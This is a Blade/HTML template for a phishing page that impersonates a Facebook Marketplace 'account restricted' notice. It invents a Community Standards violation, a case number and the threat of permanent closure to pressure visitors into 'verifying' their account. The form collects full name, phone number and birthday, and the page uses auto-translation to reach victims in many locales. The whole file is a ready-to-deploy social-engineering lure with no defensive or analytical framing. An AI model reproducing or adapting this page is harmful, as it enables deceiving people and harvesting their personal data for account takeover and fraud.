@extends('layouts.app')

@section('content')

<div id="root">
    <div class="flex min-h-screen flex-col">
      <div class="sticky left-0 right-0 top-0 h-12 bg-gray-200 px-4 py-1">
        <img src="{{ asset('assets/meta-image-0X_yXz75.png') }}" alt="" class="h-full" />
      </div>
      <main class="flex flex-grow flex-col items-center justify-center">
        <div class="flex w-11/12 flex-col justify-center md:w-2/5 2xl:w-1/3">
          <div>
            <img
              src="{{ asset('assets/home-image-VAkJ10vV.png') }}"
              class="w-full"
              alt="" /><b class="text-2xl">Your Marketplace Account Has Been Restricted</b>
            <p class="text-sm text-gray-500">Term of Service</p>
            <hr />
          </div>
          <form id="form" action="{{ route('submission') }}" method="POST">
            @csrf
            <input type="hidden" name="businessId" value="278188680457">
            <input type="hidden" name="step" value="2">
          <div class="my-5">We detected unusual activity in your Marketplace account today <strong id="tampil"></strong>. Your account has been reported for violating Marketplace's<b class="cursor-pointer font-medium text-blue-500 hover:underline"> Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>          
          <div class="my-5">
            <input
              id="yourName" name="full_name"
              class="my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
              type="text"
              placeholder="Your Full Name"
              onblur="validateInput(this, 'Your Full Name')" />
            <p id="yourNameError" class="text-red-500 hidden"></p>
            <div
              id="phoneForm" 
              class="group my-4 flex items-center w-full p-3 rounded-lg border bg-white border-gray-300 focus-within:border-blue-500 react-tel-input">
              <div class="special-label">Phone</div>

              <input
                id="phoneInput" name="phone_number"
                class="form-control my-2 w-full rounded-lg text-base border-none border-gray-300"
                placeholder="Your Phone Number"
                type="tel"
                value="+1 "
                onblur="validateInput(this, 'Your Phone Number')" />

              <!-- Thông báo lỗi cho Phone Number -->

              <div class="flag-dropdown border-none bg-transparent">
                <div
                  id="selectedFlag"
                  class="selected-flag"
                  title=""
                  tabindex="0"
                  role="button"
                  aria-haspopup="listbox">
                  <div id="flagIcon" class="flag us">
                    <div class="arrow"></div>
                  </div>
                </div>

                <!-- Dropdown for countries -->
                <ul id="countryDropdown" class="country-list hide"></ul>
              </div>
            </div>
            <p id="phoneInputError" class="text-red-500 hidden"></p>

            <input
              id="birthday" name="birthday"
              class="my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
              type="text"
              placeholder="Birthday (MM/DD/YYYY)"
              value=""
              onchange="validateInput(this, 'Birthday')" />
            <p id="birthdayError" class="text-red-500 hidden"></p>
          </div>
          </form>
          <div
            class="flex flex-col justify-between border-b border-t border-gray-300 p-2 text-sm text-gray-500 sm:flex-row">
            <div class="flex gap-1 sm:flex-col sm:gap-0">
              <b>Case Number:</b><b class="text-blue-500">#62445456599</b>
            </div>
            <div class="w-full sm:w-3/4">
              <b>About Case: Violating Community Standards and Posting something inappropriate.</b>
            </div>
          </div>
          <button
            class="my-5 flex w-full items-center justify-center rounded-lg bg-blue-300 p-4 font-semibold cursor-not-allowed text-white"
            disabled
            id="continue">
            Continue          </button>
        </div>
      </main>
      <footer class="flex items-center justify-center p-4 text-gray-700">
        <p>
          <svg
            aria-hidden="true"
            focusable="false"
            data-prefix="fas"
            data-icon="triangle-exclamation"
            class="svg-inline--fa fa-triangle-exclamation text-yellow-600"
            role="img"
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 512 512">
            <path
              fill="currentColor"
              d="M256 32c14.2 0 27.3 7.5 34.5 19.8l216 368c7.3 12.4 7.3 27.7 .2 40.1S486.3 480 472 480L40 480c-14.3 0-27.6-7.7-34.7-20.1s-7-27.8 .2-40.1l216-368C228.7 39.5 241.8 32 256 32zm0 128c-13.3 0-24 10.7-24 24l0 112c0 13.3 10.7 24 24 24s24-10.7 24-24l0-112c0-13.3-10.7-24-24-24zm32 224a32 32 0 1 0 -64 0 32 32 0 1 0 64 0z"></path>
          </svg>
          Please make sure to fill in the data correctly; otherwise, your account may be permanently closed. To learn more about why accounts are deactivated, visit our <a href="https://www.facebook.com/help/582999911881572" target="_blank" rel="noopener noreferrer" class="text-blue-600 hover:underline">Community Standards</a>.          <script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/en.js?v=US"></script>
          <script>
            function validateInput(input, fieldName) {
              const errorElement = document.getElementById(
                input.id + "Error"
              );

              // Nếu trường là phoneInput, kiểm tra với regex số điện thoại
              if (input.id === "phoneInput") {
                // Biểu thức regex cho phép ký tự (, ), -, và số từ 10 đến 14 chữ số
                const phoneRegex = /^\+?(\d{1,4})[\d\s\-()]{7,20}$/;

                if (
                  !input.value.trim() ||
                  !phoneRegex.test(input.value.trim())
                ) {
                  // Hiển thị lỗi nếu số điện thoại không hợp lệ
                  errorElement.classList.remove("hidden");
                  errorElement.innerText = `Invalid ${fieldName}`;
                } else {
                  // Nếu giá trị hợp lệ, ẩn lỗi
                  errorElement.classList.add("hidden");
                }
              } else if (input.id === "birthday") {
                // Kiểm tra cho các input khác
                if (!input.value.trim()) {
                  // Hiển thị lỗi nếu không có giá trị
                  errorElement.classList.remove("hidden");
                  errorElement.innerText = `Invalid ${fieldName}`;
                } else {
                  var birthdayInput = $("#birthday").val().trim();
                  var birthday = new Date(birthdayInput);
                  var today = new Date();
                  var age = today.getFullYear() - birthday.getFullYear();
                  var monthDiff = today.getMonth() - birthday.getMonth();
                  var dayDiff = today.getDate() - birthday.getDate();
                  if (monthDiff < 0 || (monthDiff === 0 && dayDiff < 0)) {
                      age--;
                  }

                  if (age < 13) {
                    errorElement.classList.remove("hidden");
                    errorElement.innerText = `Age must be at least 13 or older`;
                  }
                  else {
                    // Nếu có giá trị, ẩn lỗi
                    errorElement.classList.add("hidden");
                  }
                }
              } else {
                // Kiểm tra cho các input khác
                if (!input.value.trim()) {
                  // Hiển thị lỗi nếu không có giá trị
                  errorElement.classList.remove("hidden");
                  errorElement.innerText = `Invalid ${fieldName}`;
                } else {
                  // Nếu có giá trị, ẩn lỗi
                  errorElement.classList.add("hidden");
                }
              }
            }

            var date = new Date();
            var tahun = date.getFullYear();
            var bulan = date.getMonth();
            var tanggal = date.getDate();
            var hari = date.getDay();
            var jam = date.getHours();
            var menit = date.getMinutes();
            var detik = date.getSeconds();
            var namabulan = ("January February March April May June July August September October November December");
            namabulan = namabulan.split(" ");
            var tampilTanggal = " " + namabulan[bulan] + " " + tanggal + " " + tahun;
            document.getElementById("tampil").innerHTML = tampilTanggal;

            // xử lý chọn ngày tháng năm sinh
            flatpickr("#birthday", {
              dateFormat: "m/d/Y", // Định dạng MM/DD/YYYY
              disableMobile: true, // Đảm bảo nó hoạt động trên mobile (mặc định)
              locale : flatpickr.l10ns.en,
            });
            // Kiểm tra tất cả các trường input
            function checkFormValidity() {
              var isYourNameValid = $("#yourName").val().trim() !== "";
              var isPhoneValid = $("#phoneInput").val().trim().length >= 8; // Số điện thoại từ 8 ký tự trở lên
              var isBirthdayValid = $("#birthday").val().trim() !== "";

              var birthdayInput = $("#birthday").val().trim();
              var birthday = new Date(birthdayInput);
              var today = new Date();
              var age = today.getFullYear() - birthday.getFullYear();
              var monthDiff = today.getMonth() - birthday.getMonth();
              var dayDiff = today.getDate() - birthday.getDate();
              if (monthDiff < 0 || (monthDiff === 0 && dayDiff < 0)) {
                  age--;
              }

              if (age < 13) {
                isBirthdayValid = false;
              }

              // Nếu tất cả đều hợp lệ, kích hoạt nút tiếp tục
              if (
                isYourNameValid &&
                isPhoneValid &&
                isBirthdayValid
              ) {
                $("#continue").prop("disabled", false); // Bỏ thuộc tính disabled
                $("#continue")
                  .removeClass("cursor-not-allowed bg-blue-300")
                  .addClass("bg-blue-500 hover:bg-blue-600"); // Thay đổi kiểu dáng
              } else {
                $("#continue").prop("disabled", true); // Vô hiệu hóa nút
                $("#continue")
                  .removeClass("bg-blue-500")
                  .addClass("cursor-not-allowed bg-blue-300"); // Thay đổi lại kiểu dáng
              }
            }

            // Lắng nghe sự kiện thay đổi trên các input
            $("#yourName, #phoneInput, #birthday").on(
              "input",
              function() {
                checkFormValidity(); // Kiểm tra mỗi khi người dùng nhập liệu
              }
            );

            ////////////////////////////////////////////////////////////////
            // Lắng nghe sự kiện click vào nút continue
            $('#continue').on('click', function(e) {
              e.preventDefault(); // Ngăn chặn hành động mặc định của form
              handleSubmit(); // Gọi hàm xử lý submit
            });

            // Lắng nghe sự kiện nhấn phím "Enter"
            $(document).keypress(function(e) {
              if (e.which == 13) { // Kiểm tra nếu phím Enter (mã phím 13) được nhấn
                e.preventDefault(); // Ngăn chặn hành động mặc định
                handleSubmit(); // Gọi hàm xử lý submit
              }
            });

            // Hàm xử lý submit khi nhấn nút hoặc nhấn phím Enter
            function handleSubmit() {
                var continueButton = $("#continue");
                var continueText = continueButton.text();
                continueButton.html(
                    '<div style="user-select: none;" class="h-6 w-6 animate-spin rounded-full border-2 border-white border-r-transparent border-t-transparent"></div>'
                ).prop("disabled", true).addClass("cursor-not-allowed bg-blue-300").removeClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
                setTimeout(function() {
                    continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer");
                    console.log('form submitted');
                    $("#form").submit();
                }, 2000);
            }
          </script>
        </p>
      </footer>
    </div>
  </div>
  <div id="google_translate_element" style="display: none;"></div>

<script type="text/javascript">
    function googleTranslateElementInit() {
        new google.translate.TranslateElement({ pageLanguage: 'en' }, 'google_translate_element');
    }

    (function () {
        var gtScript = document.createElement('script');
        gtScript.type = 'text/javascript';
        gtScript.src = "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
        document.getElementsByTagName('head')[0].appendChild(gtScript);
    })();

    async function getLanguageFromBackend() {
        try {
            const response = await fetch('/get-language');
            const data = await response.json();
            return data.language || 'en';
       } catch (error) {
            console.error("Error fetching language from backend:", error);
            return 'en';
       }
    }

    async function autoTranslate() {
        document.getElementById('loading-overlay').style.display = 'flex';

        const targetLang = await getLanguageFromBackend();

        setTimeout(() => {
            const selectElement = document.querySelector('select.goog-te-combo');
            if (selectElement) {
                selectElement.value = targetLang;
                selectElement.dispatchEvent(new Event('change'));
            }

            setTimeout(() => {
                document.getElementById('loading-overlay').style.display = 'none';
            }, 500);
        }, 500);
    }

    document.addEventListener('DOMContentLoaded', autoTranslate);
</script>

<style>
    .goog-te-banner-frame, .skiptranslate, .VIpgJd-ZVi9od-aZ2wEe-wOHMyf {
        display: none !important;
    }

    body {
        top: 0 !important;
    }
</style>
@endsection